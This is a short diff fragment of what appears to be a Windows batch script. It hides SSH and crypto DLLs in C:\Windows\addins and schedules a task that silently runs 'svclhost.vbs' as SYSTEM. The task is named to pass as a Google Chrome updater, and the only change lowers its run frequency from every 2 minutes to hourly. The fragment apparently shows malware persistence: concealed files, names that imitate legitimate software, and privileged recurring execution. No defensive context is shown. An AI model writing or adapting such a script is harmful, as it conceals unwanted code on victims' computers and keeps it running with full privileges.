@@ -54,7 +54,7 @@ attrib +h +s "C:\Windows\addins\libcrypto-3.dll"
 attrib +h +s "C:\Windows\addins\libssh2.dll"
 attrib +h +s "C:\Windows\addins\libssl-3.dll"
 
-SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\addins\svclhost.vbs" /ST %n_tm% /RU system /F
+SCHTASKS /CREATE /SC MINUTE /MO 60 /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\addins\svclhost.vbs" /ST %n_tm% /RU system /F
 
 w32tm /resync
 
